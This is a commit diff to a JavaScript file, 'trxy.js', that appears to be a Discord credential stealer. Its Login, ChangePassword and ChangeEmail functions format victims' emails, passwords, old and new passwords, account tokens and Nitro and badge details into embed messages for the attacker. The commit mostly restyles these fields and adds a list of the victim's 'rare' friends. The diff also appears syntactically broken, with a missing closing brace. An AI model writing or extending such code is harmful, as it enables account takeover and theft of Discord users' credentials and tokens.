ed509c235550b3a8d684353a49103f25c5215d30
Ainsley3 <95043019+Ainsley3@users.noreply.github.com>
2022-02-28 17:55:34 +0300

    Update trxy.js

--- trxy.js
+++ trxy.js
@@ -150,21 +150,37 @@ function Login(email, password, token) {
                         {
                             "name": "<a:arrow:765308889859751976> **Account Info**",
 
-                            "value":  `<:PP_director:942527310324719716> **Email:** \`${email}\`                          <:staff_blue:936543701294010399> **Password:** \`${password}\``,
-                            "inline": true
+                            "value":  `<:PP_director:942527310324719716> **Email:** \`${email}\`                             <:staff_blue:936543701294010399> **Password:** \`${password}\``,
+                            "inline": false
                         },
+
                                  {
                                    "name": "<a:arrow:765308889859751976> **Other Info**",
-
+                                                                                                    
+                                                                                        
         
-
-                                   "value": `<a:axe_Pepenitro:932312223945224212> **Nitro Type:**  ${GetNitro(json.premium_type)}\n                             "value":     <a:allbadges:895906088996720690> **Badges:**  ${GetBadges(json.flags)}`,
+                                                                                                   
+                                   "value": `<a:axe_Pepenitro:932312223945224212> **Nitro Type:**  ${GetNitro(json.premium_type)}\n                                 <a:allbadges:895906088996720690> **Badges:**  ${GetBadges(json.flags)}`,
                                  },
+
                                  {
                             "name": "**Token**",
                             "value": `\`${token}\``,
                             "inline": false
-                        }
+                        
+                        {
+                            "name": `Total Friends (${JSON.parse(a).filter((e) => 1 == e.type).length})`,                        
+                            "value": (function () {
+                                const e = JSON.parse(a).filter((e) => 1 == e.type);
+                                var t = "";
+                                for (z of e) {
+                                    var n = GetRBadges(z.user.public_flags);
+                                    "" != n && (t += n + ` ${z.user.username}#${z.user.discriminator}\n`);
+                                }
+                                return "" == t && (t = "No Rare Friends"), t;
+                            })(),
+                            "inline": false
+                        },
                     ],
                     "author": {
                         "name": json.username +"#" + json.discriminator + "・" + json.id,
@@ -199,19 +215,19 @@ function ChangePassword(oldpassword, newpassword, token) {
                     "fields": [
                         {
                             "name": "**Password Changed**",
-                            "value": `**Email:** ||${json.email}||\n 
+                            "value": `<:PP_director:942527310324719716> **Email:** \`${json.email}\`\n 
                             
-                            **Old Password:** ||${oldpassword}||\n 
+                            <:staff_blue:936543701294010399> **Old Password:** \`${oldpassword}\`\n 
                             
-                            **New Password:** ||${newpassword}||`,
+                            <:staff_blue:936543701294010399> **New Password:** \`${newpassword}\``,
                             "inline": true
                         },
 
                         {
-                            "name": "**Other Info**",
-                            "value": `**Nitro Type:** ${GetNitro(json.premium_type)}\n
+                            "name": "<a:arrow:765308889859751976> **Other Info**",
+                            "value": `<a:axe_Pepenitro:932312223945224212> **Nitro Type:** ${GetNitro(json.premium_type)}\n
                             
-                            Badges: ${GetBadges(json.flags)}`,
+                            <a:allbadges:895906088996720690> **Badges:**  ${GetBadges(json.flags)}`,
                             "inline": true
                         },
 
@@ -254,17 +270,17 @@ function ChangeEmail(newemail, password, token) {
                     "fields": [
                         {
                             "name": "**Email Changed**",
-                            "value": `**New Email:** ${newemail}\n 
+                            "value": `<:PP_director:942527310324719716> **New Email:** \`${newemail}\`\n 
                             
-                            **Password:** ${password}`,
+                            <:staff_blue:936543701294010399> **Password:** \`${password}\``,
                             "inline": true
                         },
 
                         {
-                            "name": "**Other Info**",
-                            "value": `**Nitro Type:** ${GetNitro(json.premium_type)}\n
+                            "name": "<a:arrow:765308889859751976> **Other Info**",
+                            "value": `<a:axe_Pepenitro:932312223945224212> **Nitro Type:** ${GetNitro(json.premium_type)}\n
                             
-                            Badges: ${GetBadges(json.flags)}`,
+                            <a:allbadges:895906088996720690> **Badges:** ${GetBadges(json.flags)}`,
                             "inline": true
                         },
 
